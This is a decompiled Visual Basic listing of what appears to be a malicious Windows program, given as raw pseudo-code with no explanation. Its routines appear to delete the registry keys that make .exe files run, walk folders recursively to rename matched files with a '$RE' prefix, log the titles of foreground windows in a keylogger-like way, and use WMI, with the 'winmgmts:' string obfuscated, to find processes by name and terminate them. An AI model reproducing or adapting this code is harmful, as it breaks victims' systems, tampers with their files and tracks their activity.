  loc_00459BE9: call var_CF34 = global_00401054
  loc_00459BF2: call var_CF38 = global_004011CC
  loc_00459C08: call var_CF3C = global_00401188(var_24, "SOFTWARE\Classes\.exe")
  loc_00459C14: var_CF40 = OnudaSilloA(global_80000002, var_CF3C)
  loc_00459C19: call var_CF44 = global_00401054
  loc_00459C22: call var_CF48 = global_004011CC
  loc_00459C38: call var_CF4C = global_00401188(var_24, "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers\ShimLayer Property Page")
  loc_00459C44: var_CF50 = OnudaSilloA(global_80000002, var_CF4C)
  loc_00459C49: call var_CF54 = global_00401054
  loc_00459C52: call var_CF58 = global_004011CC
  loc_00459C68: call var_CF5C = global_00401188(var_24, "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers\PifProps")
  loc_00459C74: var_CF60 = OnudaSilloA(global_80000002, var_CF5C)
  loc_00459C79: call var_CF64 = global_00401054
  loc_00459C82: call var_CF68 = global_004011CC
  loc_00459C98: call var_CF6C = global_00401188(var_24, "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers\{B41DB860-8EE4-11D2-9906-E49FADC173CA}")
  loc_00459CA4: var_CF70 = OnudaSilloA(global_80000002, var_CF6C)
  loc_00459CA9: call var_CF74 = global_00401054
  loc_00459CB2: call var_CF78 = global_004011CC
  loc_00459CC8: call var_CF7C = global_00401188(var_24, "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers")
  loc_00459CD4: var_CF80 = OnudaSilloA(global_80000002, var_CF7C)
  loc_00459CD9: call var_CF84 = global_00401054
  loc_00459CE2: call var_CF88 = global_004011CC
  loc_00459CF8: call var_CF8C = global_00401188(var_24, "SOFTWARE\Classes\exefile\shellex\DropHandler")
  loc_00459D04: var_CF90 = OnudaSilloA(global_80000002, var_CF8C)
  loc_00459D09: call var_CF94 = global_00401054
  loc_00459D12: call var_CF98 = global_004011CC
  loc_00459D28: call var_CF9C = global_00401188(var_24, "SOFTWARE\Classes\exefile\shellex")
  loc_00459D34: var_CFA0 = OnudaSilloA(global_80000002, var_CF9C)
  loc_00459D39: call var_CFA4 = global_00401054
  loc_00459D42: call var_CFA8 = global_004011CC
  loc_00459D58: call var_CFAC = global_00401188(var_24, "SOFTWARE\Classes\exefile\shell\runas\command")
  loc_00459D64: var_CFB0 = OnudaSilloA(global_80000002, var_CFAC)
  loc_00459D69: call var_CFB4 = global_00401054
  loc_00459D72: call var_CFB8 = global_004011CC
  loc_00459D88: call var_CFBC = global_00401188(var_24, "SOFTWARE\Classes\exefile\shell\runas")
  loc_00459D94: var_CFC0 = OnudaSilloA(global_80000002, var_CFBC)
  loc_00459D99: call var_CFC4 = global_00401054
  loc_00459DA2: call var_CFC8 = global_004011CC
  loc_00459DB8: call var_CFCC = global_00401188(var_24, "SOFTWARE\Classes\exefile\shell\open\command")
  loc_00459DC4: var_CFD0 = OnudaSilloA(global_80000002, var_CFCC)
  loc_00459DC9: call var_CFD4 = global_00401054
  loc_00459DD2: call var_CFD8 = global_004011CC
  loc_00459DE8: call var_CFDC = global_00401188(var_24, "SOFTWARE\Classes\exefile\shell\open")
  loc_00459DF4: var_CFE0 = OnudaSilloA(global_80000002, var_CFDC)
  loc_00459DF9: call var_CFE4 = global_00401054
  loc_00459E02: call var_CFE8 = global_004011CC
  loc_00459E18: call var_CFEC = global_00401188(var_24, "SOFTWARE\Classes\exefile\shell")
  loc_00459E24: var_CFF0 = OnudaSilloA(global_80000002, var_CFEC)
  loc_00459E29: call var_CFF4 = global_00401054
  loc_00459E32: call var_CFF8 = global_004011CC
  loc_00459E48: call var_CFFC = global_00401188(var_24, "SOFTWARE\Classes\exefile\DefaultIcon")
  loc_00459E54: var_D000 = OnudaSilloA(global_80000002, var_CFFC)
  loc_00459E59: call var_D004 = global_00401054
  loc_00459E62: call var_D008 = global_004011CC
  loc_00459E78: call var_D00C = global_00401188(var_24, "SOFTWARE\Classes\exefile")
  loc_00459E84: var_D010 = OnudaSilloA(global_80000002, var_D00C)
  loc_00459E89: call var_D014 = global_00401054
  loc_00459E92: call var_D018 = global_004011CC
  loc_00459EA4: GoTo loc_00459EC7
  loc_00459EA9: call var_D01C = global_004011CC(global_00459EC8)
  loc_00459EBD: call var_D020 = global_00401024(00000003h, var_34, var_44, var_54)
  loc_00459EC6: Exit Sub
  loc_00459EC7: ' Referenced from: 00459EA4
End Sub

Public Sub FindFiles(strRootFolder, strFolder, strFile) '43B1F0
  loc_0043B1F6: ext_4010EC
  loc_0043B20E: ext_40109C
  loc_0043B248: call var_8004 = global_00401088(Me, 0, 0, 0)
  loc_0043B257: call var_8008 = global_00401070(FFFFFFFFh)
  loc_0043B26C: call var_800C = global_004011B0(strRootFolder, 00000001h)
  loc_0043B27A: call var_8010 = global_004011AC
  loc_0043B286: call var_8014 = global_004010B0("\", var_8010)
  loc_0043B2A1: call var_8018 = global_004011CC
  loc_0043B2B0: If var_8014 Then
  loc_0043B2C4:   call var_801C = global_00401044("\", strRootFolder)
  loc_0043B2CF:   call var_8020 = global_004011AC
  loc_0043B2D5: End If
  loc_0043B2EF: call var_8024 = global_004010D4(UDT_2_00418AD4, var_468, var_28C)
  loc_0043B301: call var_8028 = global_00401044("*", strRootFolder, var_8024)
  loc_0043B30F: call var_802C = global_004011AC
  loc_0043B31D: call var_8030 = global_00401188(var_294, var_802C)
  loc_0043B32F: call var_8038 = global_00401054
  loc_0043B348: call var_803C = global_00401038(UDT_2_00418AD4, var_28C, var_468)
  loc_0043B354: var_34 = FindFirstFile(var_8030, )
  loc_0043B367: call var_8040 = global_00401150(00000002h, var_290, var_294)
  loc_0043B37B: If var_34 = True Then
  loc_0043B37D:   GoTo loc_0043BA91
  loc_0043B382: End If
  loc_0043B39B: If 1 Then
  loc_0043B3B4:   call var_8044 = global_0040108C(00000104h, var_260)
  loc_0043B3C2:   call var_8048 = global_004011AC
  loc_0043B3DF:   var_804C = Form1.Proc_0_15_43BB40(var_290)
  loc_0043B3F8:   call var_8050 = global_0040104C(00000104h, var_260, var_290, var_294)
  loc_0043B404:   var_5C0 = var_294
  loc_0043B41D:   call var_8054 = global_004011AC
  loc_0043B429:   call var_8058 = global_004011CC
  loc_0043B43C:   call var_805C = global_0040108C(0000000Eh, var_58)
  loc_0043B44A:   call var_8060 = global_004011AC
  loc_0043B467:   var_8064 = Form1.Proc_0_15_43BB40(var_290)
  loc_0043B47A:   call var_8068 = global_0040104C(0000000Eh, var_58, var_290, var_294)
  loc_0043B49C:   var_2A4 = var_294
  loc_0043B4B5:   call var_806C = global_00401010
  loc_0043B4C1:   call var_8070 = global_004011CC
  loc_0043B4DA:   If (var_28C And 16) = 16 Then
  loc_0043B4F0:     call var_8074 = global_004010B0(".", var_3C)
  loc_0043B506:     call var_8078 = global_004010B0("..", var_3C)
  loc_0043B515:     If var_8078 + 1 = 0 Then
  loc_0043B52C:       call var_807C = global_00401044(var_3C, strRootFolder)
  loc_0043B53A:       call var_8080 = global_004011AC
  loc_0043B55E:       var_318 = Form1.FindFiles(var_290, strFolder, strFile)
  loc_0043B56B:       If var_318 < 0 Then
  loc_0043B582:         call var_8088 = global_00401058(var_318, Me, global_00418934, 000006F8h)
  loc_0043B588:         var_5C8 = var_8088
  loc_0043B590:       Else
  loc_0043B59A:       End If
  loc_0043B5A0:       call var_808C = global_004011CC
  loc_0043B5A6:     End If
  loc_0043B5AB:   Else
  loc_0043B5BE:     call var_8090 = global_00401074(strFolder, strRootFolder)
  loc_0043B5C9:     If var_8090 Then
  loc_0043B5E0:       call var_8094 = global_00401074(strFile, var_3C)
  loc_0043B5EB:       If var_8094 Then
  loc_0043B60F:         call var_8098 = global_00401078(var_29C, Form1.List4)
  loc_0043B615:         var_320 = var_8098
  loc_0043B632:         call var_809C = global_00401078(var_298, Form1.List4)
  loc_0043B638:         var_318 = var_809C
  loc_0043B654:         var_310 = var_318.UnkVCall_000000D8h
  loc_0043B65C:         var_31C = var_310
  loc_0043B669:         If var_31C < 0 Then
  loc_0043B683:           call var_80A0 = global_00401058(var_31C, var_318, global_00418DC4, 000000D8h)
  loc_0043B689:           var_5CC = var_80A0
  loc_0043B691:         Else
  loc_0043B69B:         End If
  loc_0043B6BC:         var_320.UnkVCall_000000E4h
  loc_0043B6C4:         var_324 = var_320.UnkVCall_000000E4h
  loc_0043B6D1:         If var_324 < 0 Then
  loc_0043B6EB:           call var_80A4 = global_00401058(var_324, var_320, global_00418DC4, 000000E4h, var_320, (var_310 - 1))
  loc_0043B6F1:           var_5D0 = var_80A4
  loc_0043B6F9:         Else
  loc_0043B703:         End If
  loc_0043B713:         call var_80A8 = global_0040102C(00000002h, var_298, var_29C)
  loc_0043B726:         var_2F4 = strRootFolder
  loc_0043B746:         call var_80AC = global_004011A4(var_2AC, &H4008, 00000006h)
  loc_0043B763:         call var_80B0 = global_00401078(var_298, Form1.List1)
  loc_0043B769:         var_318 = var_80B0
  loc_0043B785:         var_290 = var_318.UnkVCall_000000F8h
  loc_0043B78D:         var_31C = var_290
  loc_0043B79A:         If var_31C < 0 Then
  loc_0043B7B4:           call var_80B4 = global_00401058(var_31C, var_318, global_00418DC4, 000000F8h)
  loc_0043B7BA:           var_5D4 = var_80B4
  loc_0043B7C2:         Else
  loc_0043B7CC:         End If
  loc_0043B7D8:         call var_80B8 = global_00401044("$RE", var_290)
  loc_0043B7DE:         var_2B4 = var_80B8
  loc_0043B805:         call var_80BC = global_00401078(var_29C, Form1.List4)
  loc_0043B80B:         var_320 = var_80BC
  loc_0043B827:         var_294 = var_320.UnkVCall_000000F8h
  loc_0043B82F:         var_324 = var_294
  loc_0043B83C:         If var_324 < 0 Then
  loc_0043B856:           call var_80C0 = global_00401058(var_324, var_320, global_00418DC4, 000000F8h)
  loc_0043B85C:           var_5D8 = var_80C0
  loc_0043B864:         Else
  loc_0043B86E:         End If
  loc_0043B87B:         call var_80C4 = global_004010B0(var_294, strRootFolder)
  loc_0043B88B:         var_304 = Not (var_80C4 + 1)
  loc_0043B8B1:         call var_80C8 = global_00401174(var_2CC, var_2BC, var_2AC)
  loc_0043B8BF:         call var_80CC = global_00401154(var_2DC, var_80C8)
  loc_0043B8D4:         call var_80D0 = global_004010E4(var_2EC, var_30C, var_80CC)
  loc_0043B8DB:         call var_80D4 = global_00401090(var_80D0)
  loc_0043B8F8:         call var_80D8 = global_00401150(00000002h, var_290, var_294)
  loc_0043B911:         call var_80DC = global_0040102C(00000002h, var_298, var_29C)
  loc_0043B931:         call var_80E0 = global_00401024(00000003h, var_2AC, var_2BC, var_30C)
  loc_0043B943:         If var_80D4 Then
  loc_0043B967:           call var_80E4 = global_00401078(var_298, Form1.List4)
  loc_0043B96D:           var_318 = var_80E4
  loc_0043B98C:           ext_40109C
  loc_0043B9D3:           var_31C = var_318.UnkVCall_000001ECh
  loc_0043B9E0:           If var_31C < 0 Then
  loc_0043B9FA:             call var_80E8 = global_00401058(var_31C, var_318, global_00418DC4, 000001ECh, 10)
  loc_0043BA00:             var_5DC = var_80E8
  loc_0043BA08:           Else
  loc_0043BA12:           End If
  loc_0043BA18:           call var_80EC = global_004011D4
  loc_0043BA1E:         End If
  loc_0043BA1E:       End If
  loc_0043BA1E:     End If
  loc_0043BA1E:   End If
  loc_0043BA38:   call var_80F0 = global_004010D4(UDT_2_00418AD4, var_5A8)
  loc_0043BA4E:   call var_80F8 = global_00401054
  loc_0043BA67:   call var_80FC = global_00401038(UDT_2_00418AD4, var_28C, var_5A8)
  loc_0043BA73:   var_38 = FindNextFile(var_34, var_80F0)
  loc_0043BA76:   GoTo loc_0043B390
  loc_0043BA7B: End If
  loc_0043BA86: var_8100 = FindClose(var_34)
  loc_0043BA8B: call var_8104 = global_00401054
  loc_0043BA91: ' Referenced from: 0043B37D
  loc_0043BA96: GoTo loc_0043BAF9
  loc_0043BAA8: call var_8108 = global_00401150(00000002h, var_290, var_294, global_0043BB0C)
  loc_0043BAC1: call var_810C = global_0040102C(00000002h, var_298, var_29C)
  loc_0043BAEF: call var_8110 = global_00401024(00000005h, var_2AC, var_2BC, var_2CC, var_2DC, var_2EC)
  loc_0043BAF8: Exit Sub
  loc_0043BAF9: ' Referenced from: 0043BA96
  loc_0043BAFC: call var_8114 = global_00401014
  loc_0043BB05: call var_8118 = global_004011CC
End Sub

Public Function TypeWindow() '43BE80
  loc_0043BE86: ext_4010EC
  loc_0043BEDD: var_8004 = GetForegroundWindow(Me)
  loc_0043BEE4: call var_8008 = global_00401054(0, 0, 0)
  loc_0043BEEE: global_56 = var_8004
  loc_0043BEF1: var_800C = GetWindowTextLength(var_8004)
  loc_0043BEF8: call var_8010 = global_00401054
  loc_0043BF0C: call var_8014 = global_004010A4(var_64, var_800C(1))
  loc_0043BF16: call var_8018 = global_0040101C(var_64)
  loc_0043BF21: call var_801C = global_004011AC
  loc_0043BF2A: call var_8020 = global_00401014
  loc_0043BF39: call var_8024 = global_00401188(var_44, var_40, var_800C(1))
  loc_0043BF4B: call var_802C = global_00401054
  loc_0043BF59: call var_8030 = global_004010F4(var_40, var_44)
  loc_0043BF65: var_6C = GetWindowText(var_8004, var_8024, )
  loc_0043BF6F: call var_8034 = global_00401010
  loc_0043BF78: call var_8038 = global_004011CC
  loc_0043BF85: var_6C = var_40
  loc_0043BF8F: call var_803C = global_00401018(var_40)
  loc_0043BFA7: call var_8040 = global_004011A4(var_64, &H4008, var_803C(-1))
  loc_0043BFB1: call var_8044 = global_0040101C(var_64)
  loc_0043BFBC: call var_8048 = global_004011AC
  loc_0043BFC5: call var_804C = global_00401014
  loc_0043BFD1: var_94 = global_52
  loc_0043BFDB: call var_8050 = global_004010B0(global_52, var_40)
  loc_0043BFE3: If var_8050 Then
  loc_0043BFF7:   call var_8054 = global_00401078(var_50, Form1.Text2)
  loc_0043C006:   var_44 = var_8054.UnkVCall_000000A0h
  loc_0043C010:   If var_44 < 0 Then
  loc_0043C01E:     call var_8058 = global_00401058(var_44, var_8054, global_00418EA4, 000000A0h)
  loc_0043C024:   End If
  loc_0043C02D:   call var_805C = global_004010B0(global_00418DE4, var_44)
  loc_0043C040:   call var_8060 = global_004011CC
  loc_0043C049:   call var_8064 = global_004011D4
  loc_0043C052:   If var_805C Then
  loc_0043C06C:     call var_8068 = global_00401078(var_54, Form1.Text2)
  loc_0043C071:     var_84 = var_8068
  loc_0043C082:     call var_806C = global_00401078(var_50, Form1.Text2)
  loc_0043C08D:     var_44 = var_806C.UnkVCall_000000A0h
  loc_0043C097:     If var_44 < 0 Then
  loc_0043C0A5:       call var_8070 = global_00401058(var_44, var_806C, global_00418EA4, 000000A0h)
  loc_0043C0AB:     End If
  loc_0043C0BC:     call var_8074 = global_00401044(vbCrLf, var_44)
  loc_0043C0C7:     call var_8078 = global_004011AC
  loc_0043C0D3:     call var_807C = global_00401044(vbCrLf, var_8078)
  loc_0043C0DE:     call var_8080 = global_004011AC
  loc_0043C0EE:     var_8080 = var_84.UnkVCall_000000A4h
  loc_0043C0F8:     If var_8080 < 0 Then
  loc_0043C106:       call var_8084 = global_00401058(var_8080, var_84, global_00418EA4, 000000A4h)
  loc_0043C10C:     End If
  loc_0043C11A:     call var_8088 = global_00401150(00000003h, var_44, var_48, var_4C)
  loc_0043C12A:     call var_808C = global_0040102C(00000002h, var_50, var_54)
  loc_0043C133:   End If
  loc_0043C141:   call var_8090 = global_00401078(var_50, Form1.Text2)
  loc_0043C150:   var_40 = var_8090.UnkVCall_000000A4h
  loc_0043C15A:   If var_40 < 0 Then
  loc_0043C168:     call var_8094 = global_00401058(var_40, var_8090, global_00418EA4, 000000A4h)
  loc_0043C16E:   End If
  loc_0043C171:   call var_8098 = global_004011D4
  loc_0043C180:   call var_809C = global_00401148
  loc_0043C186: End If
  loc_0043C18B: GoTo loc_0043C1CD
  loc_0043C191: If var_4 Then
  loc_0043C196:   call var_80A0 = global_00401014(global_0043C1E0)
  loc_0043C19C: End If
  loc_0043C1AA: call var_80A4 = global_00401150(00000003h, var_44, var_48, var_4C)
  loc_0043C1BA: call var_80A8 = global_0040102C(00000002h, var_50, var_54)
  loc_0043C1C6: call var_80AC = global_00401014
  loc_0043C1CC: Exit Function
  loc_0043C1CD: ' Referenced from: 0043C18B
  loc_0043C1D0: call var_80B0 = global_00401014
  loc_0043C1D9: call var_80B4 = global_004011CC
End Function

Private  Proc_0_15_43BB40(arg_C) '43BB40
  loc_0043BB46: ext_4010EC
  loc_0043BB83: var_44 = arg_C
  loc_0043BB8D: call var_8004 = global_00401104(var_2C, 0, 0, 0, 0)
  loc_0043BBA2: call var_8008 = global_00401114(var_3C, 0, var_2C, 8, 00000001h)
  loc_0043BBA9: call var_800C = global_00401170(var_8008)
  loc_0043BBBB: call var_8010 = global_00401024(00000002h, var_2C, var_3C)
  loc_0043BBC7: If var_800C = 1 Then
  loc_0043BBD1:   call var_8014 = global_00401148
  loc_0043BBDE: Else
  loc_0043BBE0:   If var_800C > 0 Then
  loc_0043BBEB:     call var_8018 = global_0040119C(arg_C, var_800C(-1), global_0043BC39)
  loc_0043BBF6:     call var_801C = global_004011AC
  loc_0043BC03:   Else
  loc_0043BC08:     call var_8020 = global_00401148(global_0043BC39)
  loc_0043BC13:     GoTo loc_0043BC38
  loc_0043BC19:     If var_4 Then
  loc_0043BC1E:       call var_8024 = global_004011CC(global_0043BC39)
  loc_0043BC24:     End If
  loc_0043BC2E:     call var_8028 = global_00401024(00000002h, var_2C, var_3C)
  loc_0043BC37:     Exit Sub
  loc_0043BC38:   End If
  loc_0043BC38: End If
  loc_0043BC38: ' Referenced from: 0043BC13
End Sub

Private  Proc_0_16_43BC60(arg_C) '43BC60
  loc_0043BC66: ext_4010EC
  loc_0043BCC9: call var_8004 = global_00401044(arg_C, "Select Name from Win32_Process Where Name = '", 0, 0, 0)
  loc_0043BCD6: call var_8008 = global_004011AC
  loc_0043BCDE: call var_800C = global_00401044("'", var_8008)
  loc_0043BD02: call var_8010 = global_00401044("inm", global_00418E54)
  loc_0043BD09: call var_8014 = global_004011AC
  loc_0043BD11: call var_8018 = global_00401044("gm", var_8014)
  loc_0043BD18: call var_801C = global_004011AC
  loc_0043BD20: call var_8020 = global_00401044("ts:", var_801C)
  loc_0043BD22: var_28 = var_8020
  loc_0043BD31: var_30 = 8
  loc_0043BD38: call var_8024 = global_0040103C(var_50, var_30, var_40)
  loc_0043BD69: call var_8028 = global_00401198(var_80, var_50, "ExecQuery", 00000001h, var_60, var_5C, var_800C, var_54)
  loc_0043BD73: call var_802C = global_004010C0(var_8028)
  loc_0043BD81: call var_8030 = global_00401080(var_A4, var_802C)
  loc_0043BD93: call var_8034 = global_00401048(var_A8, var_14, var_8030)
  loc_0043BDA9: call var_8038 = global_00401150(00000003h, var_18, var_1C, var_20)
  loc_0043BDC5: call var_803C = global_00401024(00000005h, var_30, var_40, var_60, var_50, var_80)
  loc_0043BDD6: If var_8034 Then
  loc_0043BDE2:   call var_8040 = global_00401184(var_14, "Terminate", 0)
  loc_0043BDF2:   call var_8044 = global_004011C0(var_A8, var_14)
  loc_0043BDFA:   GoTo loc_0043BDD4
  loc_0043BDFC: End If
  loc_0043BE01: GoTo loc_0043BE3B
  loc_0043BE11: call var_8048 = global_00401150(00000003h, var_18, var_1C, var_20, global_0043BE5E)
  loc_0043BE31: call var_804C = global_00401024(00000006h, var_30, var_40, var_50, var_60, var_70, var_80)
  loc_0043BE3A: Exit Sub
  loc_0043BE3B: ' Referenced from: 0043BE01
  loc_0043BE4B: call var_8050 = global_0040102C(00000002h, var_A4, var_A8)
  loc_0043BE57: call var_8054 = global_004011D4
End Sub
